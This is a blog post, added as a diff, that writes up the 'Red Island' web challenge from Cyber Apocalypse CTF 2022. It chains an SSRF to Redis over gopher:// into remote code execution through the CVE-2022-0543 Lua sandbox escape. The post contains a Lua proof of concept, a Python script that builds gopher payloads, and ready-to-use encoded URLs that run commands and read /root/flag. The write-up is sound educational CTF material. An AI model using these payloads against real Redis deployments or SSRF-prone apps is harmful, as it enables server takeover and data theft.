@@ -1,0 +1,248 @@
+---
+title: "Cyber Apocalypse CTF 2022: Red Island [web - 325pts]"
+date: '2022-05-19'
+tags: ['ssrf', 'redis', 'rce', 'ctf']
+description: "For this web challenge we'll chain together multiple vulnerabilities, starting from a simple SSRF and resulting in RCE through a Redis service."
+---
+
+Red Island was one of the few web challenges in this CTF that did not have a downloadable zip file containing the challenge source code, meaning it was a black box challenge. By the conclusion of the CTF it had been solved by under 100 of the 7000+ teams that had signed up.
+
+## First Impression
+
+Upon first accessing the challenge application, we find a basic login/registration form which would be familiar to anyone who has already done some of the web challenges in this CTF. We can be pretty sure that there is no SQL injection (SQLi) in this form so we register a user and log in.
+
+The application is very small, with a single page. There is a logout button and more interestingly another form which is asking for a picture url, the button contains the text "convert". If we were to submit a valid link to an image, the app would grab it, process it (i.e. make it much more red) and return it back to us. The intended use of the app is not helpful in solving this challenge but if we look at the request itself we can see it is sending JSON post data containing the supplied URL.
+
+<BlogImage 
+    src="/images/cactf-red-island/challenge-home-page.png"
+    alt="challenge-home-page.png"
+    width="782"
+    height="284" 
+/>
+
+## Server-side Request Forgery
+
+If you have a bit of experience with web application testing or CTFs, your mind should pretty quickly land on the idea of Server-side Request Forgery (SSRF) here. Instead of requesting an image as expected, can we make the server request other resources that we would not be able to access ourselves?
+
+Before we continue, I think it is good to highlight the importance of error messages. If we break the request by submitting an invalid JSON structure (simply adding an erroneous apostrophe), the application complains. In this complaint is another vulnerability; an information disclosure. Reading this error message we can see the local file path of the application, which saves us some time/guessing later. 
+
+<BlogImage 
+    src="/images/cactf-red-island/error-path-disclosure.png"
+    alt="error-path-disclosure.png"
+    width="766"
+    height="315" 
+/>
+
+As in other challenges, a good first idea is to try and learn more about the application itself by reading the application source code. In this case it is pretty simple, we can use the file:// scheme instead of http, and combined with our knowledge of the app location from the earlier info disclosure we can easily retrieve the source code of the main file /app/index.js 
+
+<BlogImage 
+    src="/images/cactf-red-island/index-source-code.png"
+    alt="index-source-code.png"
+    width="762"
+    height="256" 
+/>
+
+Copying the response to a text editor and doing a couple Find and Replace edits makes the code perfectly readable.
+
+<div className="code">
+```javascript
+const express          = require('express');
+const app              = express();
+const session          = require('express-session');
+const RedisStore       = require("connect-redis")(session)
+const path             = require('path');
+const cookieParser     = require('cookie-parser');
+const nunjucks         = require('nunjucks');
+const routes           = require('./routes');
+const Database         = require('./database');
+const { createClient } = require("redis")
+const redisClient      = createClient({ legacyMode: true })
+
+const db = new Database('redisland.db');
+
+app.use(express.json());
+app.use(cookieParser());
+
+redisClient.connect().catch(console.error)
+
+app.use(
+    session({
+      store: new RedisStore({ client: redisClient }),
+      saveUninitialized: false,
+      secret: "r4yh4nb34t5B1gM4c",
+      resave: false,
+    })
+);
+
+nunjucks.configure('views', {
+    autoescape: true,
+    express: app
+});
+
+app.set('views', './views');
+app.use('/static', express.static(path.resolve('static')));
+
+app.use(routes(db));
+
+app.all('*', (req, res) => {
+    return res.status(404).send({
+        message: '404 page not found'
+    });
+});
+
+(async () => {
+    await db.connect();
+    await db.migrate();
+    app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
+})();
+```
+</div>
+
+We don't have to look far before we see connect-redis and redis. The name of the challenge suddenly makes a lot more sense and it is pretty clear we are going to need to exploit a Redis service through this SSRF. We can read various other app source files but honestly there isn't anything in them to help from this point on. 
+
+## Redis RCE
+
+<Quote text="The open source, in-memory data store used by millions of developers as a database, cache, streaming engine, and message broker." author="Redis Marketing Team" />
+
+So the question becomes, how can we force the app to send commands to the Redis service? It's not like we can connect with a proper redis client. Luckily there is plenty of reading material online if you google SSRF and Redis. It doesn't take long until we discover the gopher protocol. Without going into too much detail, Redis prior to version 7.0 supports the protocol which allows us to send commands similarly to how one would use HTTP to request a web page.
+
+<div style={{ textAlign: "center", paddingBottom: "1rem" }}>`gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0AKEYS%0D%0A%241%0D%0A%2A%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A`</div>
+
+
+If that looks ugly and confusing, don't worry - it is actually simple once you understand it. The redis-cli equivalent would be: 
+
+<div className="code"><pre><code>
+KEYS *
+QUIT 
+</code></pre></div>
+
+However, when sending commands through gopher we need to specify some extra things for each command.
+
+1. Number of arguments (denoted by a * followed by a number)
+2. Length of each argument (denoted by a $ followed by a number)
+
+In addition to the above, everything needs to be on its own line, with carriage returns (\r\n) instead of regular new lines (\n). The simple example above becomes:
+
+<div className="code"><pre><code>
+*2          # First command: number of arguments
+$4          # First command: first argument length
+KEYS        # First command: first argument value
+$1          # First command: second argument length
+\*           # First command: second argument value
+*1          # Second command: number of arguments
+$4          # Second command: first argument length
+QUIT        # Second command: first argument value
+</code></pre></div>
+
+Of course, sending some of these characters (like CRLF) over an HTTP request is no good so we URL encode the special characters, which gives the messy string seen earlier with all the %0D%0A stuff. Sending this simple request as a test to the challenge shows that we can indeed execute redis commands in this way. Note that it may take multiple requests to get a proper response, sometimes we just get a generic error. When it works, we see inside the error text the response to the Redis cmd - "sess:TpBkT-zG-PLzxuH-yzZ3-S5SGVpY23ag" 
+
+<BlogImage 
+    src="/images/cactf-red-island/redis-keys.png"
+    alt="redis-keys.png"
+    width="761"
+    height="220" 
+/>
+
+## LUA Scripting and Sandbox Escape
+
+ In some CTFs the journey may end here, with the flag hidden in a key or something like that. Not the case here. The flag is somewhere on the filesystem and we need to find and read it. Another key feature of redis is the ability to execute LUA scripts. LUA scripts are intended to be sandboxed but earlier this year Reginaldo Silva <Link href="https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce">published a sandbox escape technique</Link> he had discovered [CVE-2022-0543]. Using this, we can achieve full RCE on the target.
+
+Other articles and blog posts modify the proof-of-concept (PoC) that Reginaldo posted slightly, so that the output of the command is returned to us. The LUA script PoC is shown below: 
+
+<div className="code">
+```lua
+local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
+local io = io_l();
+local f = io.popen("id", "r");
+local res = f:read("*a");
+f:close();
+return res
+```
+</div>
+
+The above script needs to be passed into a redis EVAL command, but firstly we should check that our environment matches. We can do this quickly by using the SSRF to request file:///usr/lib/x86_64-linux-gnu/liblua5.1.so.0. The response is large so I won't include it here but suffice to say it confirms the presence of the required library so our attack should work. To send the script it needs to be added as an argument to an EVAL command and of course, "gopherised". To aid in this I put together a simple python script that will spit out the gopher URL. Credit to <Link href="https://github.com/xmsec/redis-ssrf/blob/master/ssrf-redis.py">this github repo</Link> which I based my script heavily on. 
+
+<div className="code">
+```python
+#!/usr/bin/env python3
+import urllib.parse
+
+def gen_resp(cmd):
+    cmd = cmd.split(" ")
+    res = ""
+    res += f"*{len(cmd)}\r\n"           # number of args
+    for arg in cmd:
+        res += f"${len(arg)}\r\n"       # length of arg
+        res += f"{arg}\r\n"             # value of arg
+    
+    return res
+
+def get_gopher_str(payload):
+    final_payload = f"gopher://127.0.0.1:6379/_{urllib.parse.quote(payload)}"
+    return final_payload
+
+def buildssrf(eval_cmd):
+    eval_cmd = eval_cmd.strip().replace('\n', '')
+    payload = ''
+    payload += gen_resp(f"EVAL {'Z' * len(eval_cmd)} 0")     # replace eval_cmd with string of Zs to stop it getting split on spaces
+    payload += gen_resp('QUIT')
+
+    payload = payload.replace('Z' * len(eval_cmd), eval_cmd) # put eval_cmd back into full string
+    return get_gopher_str(payload)
+
+print(buildssrf("""
+local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io');
+local io = io_l();
+local f = io.popen('id', 'r');
+local res = f:read('*a');
+f:close();
+return res
+"""))
+```
+</div>
+
+ Running the above script prints a gopher URL which when submitted through the SSRF will show us the id of the user account running the Redis service.
+
+<div style={{ textAlign: "center", paddingBottom: "1rem" }}>`gopher://127.0.0.1:6379/_%2A3%0D%0A%244%0D%0AEVAL%0D%0A%24185%0D%0Alocal%20io_l%20%3D%20package.loadlib%28%27/usr/lib/x86_64-linux-gnu/liblua5.1.so.0%27%2C%20%27luaopen_io%27%29%3B%0Alocal%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%27id%27%2C%20%27r%27%29%3B%20local%20res%20%3D%20f%3Aread%28%27%2Aa%27%29%3B%20f%3Aclose%28%29%3B%20return%20res%0D%0A%241%0D%0A0%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A`</div>
+
+For clarity, unencoded this is (lua script snipped for readability): 
+
+<div className="code"><pre><code>
+*3
+$4
+EVAL
+$185
+local io_l = package.loadlib...\<snip>...return res
+$1
+0
+*1
+$4
+QUIT
+</code></pre></div>
+
+The response from the challenge server confirms we have full-blown RCE (remember it may take a few attempts). 
+
+<BlogImage 
+    src="/images/cactf-red-island/rce-id.png"
+    alt="rce-id.png"
+    width="762"
+    height="231" 
+/>
+
+ From here it is a straightforward stroll to the finish. Enumerate the filesystem and find the flag file in /root (surprise surprise). cat the flag file and submit for those sweet points.
+
+<div style={{ textAlign: "center", paddingBottom: "1rem" }}>`gopher://127.0.0.1:6379/_%2A3%0D%0A%244%0D%0AEVAL%0D%0A%24197%0D%0Alocal%20io_l%20%3D%20package.loadlib%28%27/usr/lib/x86_64-linux-gnu/liblua5.1.so.0%27%2C%20%27luaopen_io%27%29%3B%0Alocal%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%27cat%20/root/flag%27%2C%20%27r%27%29%3B%20local%20res%20%3D%20f%3Aread%28%27%2Aa%27%29%3B%20f%3Aclose%28%29%3B%20return%20res%0D%0A%241%0D%0A0%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A `</div>
+
+<BlogImage 
+    src="/images/cactf-red-island/rce-cat-flag.png"
+    alt="rce-cat-flag.png"
+    width="761"
+    height="230" 
+/>
+
+<BlogImage 
+    src="/images/cactf-red-island/flag-on-dashboard.png"
+    alt="flag-on-dashboard.png"
+    width="840"
+    height="292" 
+/>
